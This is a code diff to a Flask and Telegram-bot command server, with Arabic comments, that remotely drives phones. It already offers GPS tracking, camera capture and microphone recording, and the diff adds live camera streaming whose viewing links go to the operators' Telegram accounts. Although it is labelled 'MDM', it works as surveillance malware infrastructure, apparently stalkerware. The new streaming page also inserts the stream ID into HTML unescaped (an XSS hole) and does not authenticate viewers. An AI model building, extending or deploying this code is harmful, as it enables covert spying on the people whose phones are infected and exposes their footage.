@@ -19,7 +19,7 @@ import threading
 import uuid
 from datetime import datetime, timedelta, timezone
 
-from flask import Flask, jsonify, make_response, request
+from flask import Flask, jsonify, make_response, request, Response
 from flask_socketio import SocketIO, emit, disconnect
 import telebot
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
@@ -248,8 +248,11 @@ COMMANDS = {
     # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
     "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
     # camera
-    "main-camera":    {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
-    "selfie-camera":  {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
+    "main-camera":               {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
+    "selfie-camera":             {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
+    "start-camera-stream-front": {"category": "camera", "label": "📺 بث كاميرا أمامية",  "description": "بث مباشر من الكاميرا الأمامية", "needs_param": False},
+    "start-camera-stream-back":  {"category": "camera", "label": "📺 بث كاميرا خلفية",   "description": "بث مباشر من الكاميرا الخلفية", "needs_param": False},
+    "stop-camera-stream":        {"category": "camera", "label": "⏹ إيقاف بث الكاميرا",  "description": "إيقاف بث الكاميرا", "needs_param": False},
     # screenshot تمت إزالته
     # audio
     "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون (اكتب المدة بالثواني)",     "needs_param": True, "param_hint": "10 أو 60 أو 120 (ثانية)"},
@@ -446,6 +449,8 @@ def data_keyboard(did):
 def camera_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"main-camera"), _cbtn(did,"selfie-camera"))
+    kb.add(_cbtn(did,"start-camera-stream-back"), _cbtn(did,"start-camera-stream-front"))
+    kb.add(_cbtn(did,"stop-camera-stream"))
     kb.add(_back(did))
     return kb
 
@@ -1545,6 +1550,158 @@ def _index():
 def _ping():
     return jsonify({"status": "alive", "timestamp": datetime.now(timezone.utc).isoformat(),
                      "active_key_sessions": len(_sessions), "version": "7.1.0"}), 200
+
+
+# ════════════════════════════════════════════════════════════════
+# ⚡⚡⚡ CAMERA LIVE STREAM - MJPEG Stream
+# ════════════════════════════════════════════════════════════════
+
+# في الذاكرة: stream_id → أحدث إطار JPEG
+_camera_streams: dict = {}  # stream_id → {"jpeg": bytes, "timestamp": float, "device_id": str}
+
+
+@app.route("/live/<stream_id>")
+def _live_stream_page(stream_id):
+    """صفحة HTML لعرض البث المباشر"""
+    if stream_id not in _camera_streams:
+        return make_response("<h1>البث غير نشط</h1><p>Stream ID: " + stream_id + "</p>", 404)
+
+    info = _camera_streams[stream_id]
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بث مباشر - {stream_id}</title>
+    <style>
+        body {{ margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; }}
+        img {{ max-width:100%; max-height:100vh; }}
+        .info {{ position:fixed; top:10px; left:10px; color:#fff; background:rgba(0,0,0,0.5); padding:10px; border-radius:5px; }}
+    </style>
+</head>
+<body>
+    <div class="info">
+        <div><b>📡 Stream:</b> {stream_id}</div>
+        <div><b>📱 Device:</b> {info.get('device_id', '?')}</div>
+        <div><b>🕐 Updated:</b> <span id="time">-</span></div>
+    </div>
+    <img src="/stream/{stream_id}" alt="Live Stream" />
+    <script>
+        setInterval(function() {{
+            fetch('/stream/{stream_id}/info').then(r=>r.json()).then(d=>{{
+                document.getElementById('time').textContent = d.last_update || '-';
+            }});
+        }}, 1000);
+    </script>
+</body>
+</html>"""
+    return html
+
+
+@app.route("/stream/<stream_id>")
+def _mjpeg_stream(stream_id):
+    """MJPEG stream - بث الإطارات كـ multipart/x-mixed-replace"""
+    if stream_id not in _camera_streams:
+        return make_response("Stream not found", 404)
+
+    def generate():
+        boundary = "frameboundary"
+        last_frame = None
+        while stream_id in _camera_streams:
+            info = _camera_streams.get(stream_id)
+            if info and info.get("jpeg"):
+                frame = info["jpeg"]
+                if frame != last_frame:
+                    last_frame = frame
+                    yield (f"--{boundary}\r\n"
+                           f"Content-Type: image/jpeg\r\n"
+                           f"Content-Length: {len(frame)}\r\n\r\n").encode() + frame + b"\r\n"
+            eventlet.sleep(0.1)  # 100ms
+
+    return Response(generate(), mimetype="multipart/x-mixed-replace; boundary=frameboundary")
+
+
+@app.route("/stream/<stream_id>/info")
+def _stream_info(stream_id):
+    """معلومات البث"""
+    if stream_id not in _camera_streams:
+        return jsonify({"error": "not found"}), 404
+    info = _camera_streams[stream_id]
+    return jsonify({
+        "stream_id": stream_id,
+        "device_id": info.get("device_id", "?"),
+        "last_update": datetime.fromtimestamp(info.get("timestamp", 0)).strftime("%H:%M:%S"),
+        "frame_size": len(info.get("jpeg", b""))
+    })
+
+
+@socketio.on("camera_frame")
+def _sock_camera_frame(data):
+    """يستقبل إطارات الكاميرا من التطبيق"""
+    try:
+        # Socket.IO sends data as array [event_name, payload]
+        if isinstance(data, list) and len(data) >= 2:
+            data = data[1]
+        
+        stream_id = data.get("stream_id", "")
+        frame_type = data.get("type", "")
+        
+        if frame_type == "camera_stream_start":
+            # بداية البث
+            device_id = data.get("device_id", "?")
+            _camera_streams[stream_id] = {
+                "jpeg": None,
+                "timestamp": time.time(),
+                "device_id": device_id
+            }
+            logger.info(f"📺 Camera stream STARTED: {stream_id} from device {device_id}")
+            
+            # أرسل رابط البث للبوت
+            if mdm_bot:
+                dev = dm.get_device_by_sid(request.sid)
+                short_label = _dev_label(dev) if dev else "?"
+                stream_url = f"https://one-1rre.onrender.com/live/{stream_id}"
+                for admin_id in Config.ADMIN_IDS:
+                    try:
+                        mdm_bot.bot.send_message(admin_id,
+                            f"📺 <b>بث مباشر للكاميرا</b>\n\n"
+                            f"📱 <b>{short_label}</b>\n"
+                            f"📷 الكاميرا: {data.get('camera', '?')}\n"
+                            f"━━━━━━━━━━━━━━━\n"
+                            f"🔗 <a href=\"{stream_url}\">اضغط هنا لمشاهدة البث</a>\n\n"
+                            f"⏹ لإيقاف البث: أرسل stop-camera-stream",
+                            parse_mode="HTML")
+                    except Exception as e:
+                        logger.error(f"❌ Failed to send stream URL: {e}")
+            return
+        
+        if frame_type == "camera_stream_stop":
+            # إيقاف البث
+            if stream_id in _camera_streams:
+                del _camera_streams[stream_id]
+            logger.info(f"⏹ Camera stream STOPPED: {stream_id}")
+            
+            if mdm_bot:
+                for admin_id in Config.ADMIN_IDS:
+                    try:
+                        mdm_bot.bot.send_message(admin_id, "⏹ تم إيقاف بث الكاميرا")
+                    except Exception:
+                        pass
+            return
+        
+        # إطار عادي
+        b64image = data.get("image", "")
+        if b64image and stream_id in _camera_streams:
+            import base64 as _b64
+            jpeg_bytes = _b64.b64decode(b64image)
+            _camera_streams[stream_id] = {
+                "jpeg": jpeg_bytes,
+                "timestamp": time.time(),
+                "device_id": _camera_streams[stream_id].get("device_id", "?")
+            }
+        
+    except Exception as e:
+        logger.error(f"❌ camera_frame error: {e}")
 
 @app.route("/init", methods=["GET"])
 def _init():
